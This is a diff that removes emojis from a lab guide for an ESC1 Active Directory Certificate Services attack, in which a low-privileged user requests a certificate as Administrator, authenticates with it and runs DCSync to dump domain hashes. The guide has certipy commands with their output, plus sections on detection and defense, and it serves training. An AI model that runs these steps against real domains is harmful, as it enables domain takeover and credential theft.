@@ -1,6 +1,6 @@
 # Scenario 1: ESC1 Attack Execution Guide
 
-## 🎯 Attack Overview
+## Attack Overview
 
 **Goal:** Escalate from low-privileged user (jdoe) to Domain Admin using ESC1 vulnerability
 
@@ -11,7 +11,7 @@ jdoe (Domain User) → Request Certificate as Administrator → Authenticate wit
 
 ---
 
-## 📋 Prerequisites Checklist
+## Prerequisites Checklist
 
 Before starting the attack, ensure:
 
@@ -24,7 +24,7 @@ Before starting the attack, ensure:
 
 ---
 
-## 🚀 Attack Execution Steps
+## Attack Execution Steps
 
 ### **Step 1: Enumerate Certificate Templates**
 
@@ -52,7 +52,7 @@ Certificate Authorities
     DNS Name                            : ca.serini.lab
     Certificate Subject                 : CN=SERINI-CA, DC=serini, DC=lab
     ...
-    
+
 Certificate Templates
   0
     Template Name                       : VulnUserAuth
@@ -65,7 +65,7 @@ Certificate Templates
     ...
 ```
 
-**📚 What this does:**
+**What this does:**
 - Connects to the domain as `jdoe`
 - Queries the CA for all certificate templates
 - Identifies templates vulnerable to ESC1
@@ -117,13 +117,13 @@ certipy req -u jdoe@serini.lab -p 'Summer2024!' \
 [*] Saved certificate and private key to 'administrator.pfx'
 ```
 
-**📚 What this does:**
+**What this does:**
 - Uses `jdoe`'s credentials to request a certificate
 - Exploits the ESC1 vulnerability to specify `administrator@serini.lab` as the SAN
 - The CA issues a certificate that says "this is the Administrator"
 - Saves the certificate to `administrator.pfx`
 
-**🔥 This is the exploit!** A low-privileged user just got a certificate for the Domain Admin!
+**This is the exploit!** A low-privileged user just got a certificate for the Domain Admin!
 
 ---
 
@@ -149,13 +149,13 @@ certipy auth -pfx administrator.pfx -dc-ip 192.168.56.10 -domain serini.lab
 [*] Got hash for 'administrator@serini.lab': aad3b435b51404eeaad3b435b51404ee:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
 ```
 
-**📚 What this does:**
+**What this does:**
 - Authenticates to the DC using the certificate (PKINIT)
 - Gets a Kerberos Ticket Granting Ticket (TGT) for Administrator
 - Extracts the Administrator's NTLM hash
 - Saves the TGT to `administrator.ccache`
 
-**🎉 You now have:**
+**You now have:**
 - Administrator's Kerberos ticket
 - Administrator's NTLM hash
 
@@ -190,14 +190,14 @@ krbtgt:502:aad3b435b51404eeaad3b435b51404ee:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:::
 ...
 ```
 
-**📚 What this does:**
+**What this does:**
 - Performs a **DCSync attack** to dump all domain credentials
 - This proves you have Domain Admin rights
 - You now have hashes for ALL domain users including `krbtgt`
 
 ---
 
-## 🎓 Learning Points
+## Learning Points
 
 ### **Why did this work?**
 
@@ -215,7 +215,7 @@ krbtgt:502:aad3b435b51404eeaad3b435b51404ee:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:::
 
 ---
 
-## 🛡️ Detection & Defense
+## Detection & Defense
 
 ### **How to detect this attack:**
 
@@ -244,7 +244,7 @@ certutil -SetCATemplates -VulnUserAuth
 
 ---
 
-## 📊 Attack Timeline
+## Attack Timeline
 
 | Step | Time | Privilege Level |
 |------|------|----------------|
@@ -254,11 +254,11 @@ certutil -SetCATemplates -VulnUserAuth
 | Authenticate with cert | 0:03 | **Domain Admin** |
 | DCSync attack | 0:04 | **Domain Admin** |
 
-**Total time: ~5 minutes** ⚡
+**Total time: ~5 minutes**
 
 ---
 
-## 🔗 References
+## References
 
 - [Certipy Documentation](https://github.com/ly4k/Certipy)
 - [Certified Pre-Owned (ESC1-8)](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
@@ -266,7 +266,7 @@ certutil -SetCATemplates -VulnUserAuth
 
 ---
 
-## ✅ Success Criteria
+## Success Criteria
 
 You have successfully completed Scenario 1 if you can:
 
@@ -276,4 +276,4 @@ You have successfully completed Scenario 1 if you can:
 - [x] Perform DCSync to dump all domain credentials
 - [x] Explain why the attack worked and how to prevent it
 
-**Congratulations! You've mastered ESC1 exploitation!** 🎉
+**Congratulations! You've mastered ESC1 exploitation!**
